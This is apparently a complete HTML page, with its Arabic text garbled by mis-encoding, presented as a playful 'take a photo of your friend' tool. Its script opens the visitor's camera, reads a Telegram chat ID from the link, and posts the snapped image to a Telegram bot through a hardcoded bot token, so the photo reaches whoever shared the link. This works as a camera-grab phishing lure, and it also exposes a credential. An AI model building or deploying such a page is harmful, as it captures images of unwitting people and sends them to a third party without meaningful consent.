<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø§Ù„ØªÙ‚Ø· ØµÙˆØ±Ø©</title>
    <style>
        body { font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background-color: #f0f2f5; }
        video { width: 90%; max-width: 400px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); background: #000; }
        button { margin-top: 20px; padding: 12px 25px; font-size: 1.1em; background-color: #007bff; color: white; border: none; border-radius: 50px; cursor: pointer; }
        #status { margin-top: 15px; color: #555; font-weight: bold; }
    </style>
</head>
<body>

    <h2>Ø§Ù„ØªÙ‚Ø· ØµÙˆØ±Ø© Ù„ØµØ¯ÙŠÙ‚Ùƒ ðŸ˜œ</h2>
    <video id="video" autoplay playsinline></video>
    <button id="snap">Ø§Ù„ØªÙ‚Ø· Ø§Ù„ØµÙˆØ±Ø© Ø§Ù„Ø¢Ù†</button>
    <p id="status"></p>

    <script>
    // Ù‡Ø°Ù‡ Ø§Ù„ÙˆØ¸ÙŠÙØ© ØªÙ‚Ø±Ø£ Ø§Ù„Ù€ ID Ù…Ù† Ø§Ù„Ø±Ø§Ø¨Ø· ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹
    const urlParams = new URLSearchParams(window.location.search);
    const dynamicChatId = urlParams.get('id'); // Ø³ÙŠØ£Ø®Ø° Ø§Ù„Ø±Ù‚Ù… Ù…Ù† Ø§Ù„Ø±Ø§Ø¨Ø·

    const token = '8488682212:AAE5KJUgyrd5QPYDE6beK21XPrBo7Y66MAg';
    const video = document.getElementById('video');
    const snap = document.getElementById('snap');
    const status = document.getElementById('status');

    // ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§... (Ù†ÙØ³ Ø§Ù„ÙƒÙˆØ¯ Ø§Ù„Ø³Ø§Ø¨Ù‚)
    navigator.mediaDevices.getUserMedia({ video: true }).then(s => { video.srcObject = s; });

    snap.addEventListener('click', () => {
        if (!dynamicChatId) {
            alert("Ø®Ø·Ø£: Ù‡Ø°Ø§ Ø§Ù„Ø±Ø§Ø¨Ø· ØºÙŠØ± ØµØ§Ù„Ø­ (Ù„Ø§ ÙŠÙˆØ¬Ø¯ ID).");
            return;
        }

        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('chat_id', dynamicChatId); // Ø§Ù„Ø¥Ø±Ø³Ø§Ù„ Ù„ØµØ§Ø­Ø¨ Ø§Ù„Ø±Ø§Ø¨Ø· ÙÙ‚Ø·
            formData.append('photo', blob, 'image.jpg');

            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).then(res => {
                if(res.ok) status.innerText = "âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø© Ù„ØµØ§Ø­Ø¨ Ø§Ù„Ø±Ø§Ø¨Ø·!";
            });
        }, 'image/jpeg');
    });
</script>
</body>
</html>